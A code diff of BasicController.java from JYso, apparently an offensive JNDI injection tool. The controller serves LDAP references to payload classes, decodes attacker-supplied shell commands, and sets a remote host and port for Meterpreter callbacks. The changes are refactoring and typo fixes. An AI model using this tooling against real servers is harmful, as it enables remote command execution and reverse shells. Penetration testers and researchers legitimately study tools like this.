@@ -6,7 +6,7 @@ import com.qi4l.JYso.exceptions.UnSupportedPayloadTypeException;
 import com.qi4l.JYso.gadgets.Config.Config;
 import com.qi4l.JYso.gadgets.utils.Gadgets;
 import com.qi4l.JYso.gadgets.utils.InjShell;
-import com.qi4l.JYso.gadgets.utils.Util;
+import com.qi4l.JYso.gadgets.utils.Utils;
 import com.qi4l.JYso.gadgets.utils.handle.ClassNameHandler;
 import com.qi4l.JYso.template.CommandTemplate;
 import com.qi4l.JYso.template.echoStatic.Meterpreter;
@@ -14,6 +14,8 @@ import com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;
 import com.unboundid.ldap.sdk.Entry;
 import com.unboundid.ldap.sdk.LDAPResult;
 import com.unboundid.ldap.sdk.ResultCode;
+import org.slf4j.Logger;
+import org.slf4j.LoggerFactory;
 
 import java.net.URL;
 import java.nio.charset.StandardCharsets;
@@ -25,12 +27,31 @@ import static org.fusesource.jansi.Ansi.ansi;
 @LdapMapping(uri = {"/basic"})
 public class BasicController implements LdapController {
 
+    private static final Logger log = LoggerFactory.getLogger(BasicController.class);
     private static String payloadType;
     // 用于对外提供动态字节码的 HTTP 服务器基础路径。
     private final String codebase = Config.codeBase;
     // 存放从 LDAP 路径中解析出的命令或连接参数。
     private String[] params = new String[0];
     private GadgetType gadgetType;
+
+    static String getStringQ(String base, int index) {
+        int cursor = 0;
+        int found = 0;
+        while (cursor < base.length()) {
+            int nextSlash = base.indexOf('/', cursor);
+            if (nextSlash == -1) nextSlash = base.length();
+
+            if (nextSlash > cursor) {
+                if (found == index) {
+                    return base.substring(cursor, nextSlash);
+                }
+                found++;
+            }
+            cursor = nextSlash + 1;
+        }
+        return "";
+    }
 
     // 向 LDAP 客户端返回引用指定 payload 类的搜索结果。
     @Override
@@ -49,21 +70,21 @@ public class BasicController implements LdapController {
             result.setResult(new LDAPResult(0, ResultCode.SUCCESS));
         } catch (Throwable er) {
             System.err.println("Error while generating or serializing payload");
-            er.printStackTrace();
+            log.error(String.valueOf(er));
         }
     }
 
     // 解析请求路径，确定 payload 类型并准备执行时所需的参数。
     @Override
     public void process(String base) throws UnSupportedPayloadTypeException, IncorrectParamsException {
-        System.out.println("- JNDI Remote Refenrence Links ");
+        System.out.println("- JNDI Remote Reference Links ");
         try {
             String normalized = base.replace('\\', '/');
             payloadType = segment(normalized, 1);
             if (payloadType.isEmpty()) {
                 throw new UnSupportedPayloadTypeException("UnSupportedPayloadType : " + normalized);
             }
-            System.out.println(ansi().fgBrightMagenta().a("  Paylaod: " + payloadType).reset());
+            System.out.println(ansi().fgBrightMagenta().a("  Payload: " + payloadType).reset());
 
             gadgetType = parseGadgetType(normalized);
             params = resolveParams(normalized);
@@ -123,20 +144,20 @@ public class BasicController implements LdapController {
 
         switch (gadgetType) {
             case base64:
-                String cmd = Util.getCmdFromBase(base);
+                String cmd = Utils.getCmdFromBase(base);
                 System.out.println(ansi().fgBrightRed().a("  Command: " + cmd).reset());
                 return new String[]{cmd};
             case shell:
-                String encoded = Util.getCmdFromBase(base);
+                String encoded = Utils.getCmdFromBase(base);
                 String decoded = new String(Base64.getDecoder().decode(encoded), StandardCharsets.UTF_8);
                 System.out.println(ansi().fgBrightRed().a("  Command: " + decoded).reset());
                 return decoded.split(" ");
             case msf:
-                String[] results = Util.getIPAndPortFromBase(base);
+                String[] results = Utils.getIPAndPortFromBase(base);
                 Config.rhost = results[0];
                 Config.rport = results[1];
-                System.out.println("  RemotHost: " + results[0]);
-                System.out.println("  RemotPort: " + results[1]);
+                System.out.println("  RemoteHost: " + results[0]);
+                System.out.println("  RemotePort: " + results[1]);
                 return results;
             default:
                 return new String[0];
@@ -145,21 +166,7 @@ public class BasicController implements LdapController {
 
     // 提取路径中第 index 个非空段，保持与原解析逻辑一致。
     private String segment(String base, int index) {
-        int cursor = 0;
-        int found = 0;
-        while (cursor < base.length()) {
-            int nextSlash = base.indexOf('/', cursor);
-            if (nextSlash == -1) nextSlash = base.length();
-
-            if (nextSlash > cursor) {
-                if (found == index) {
-                    return base.substring(cursor, nextSlash);
-                }
-                found++;
-            }
-            cursor = nextSlash + 1;
-        }
-        return "";
+        return getStringQ(base, index);
     }
 
     // 返回连字符后的子串，用于解析自定义类名。
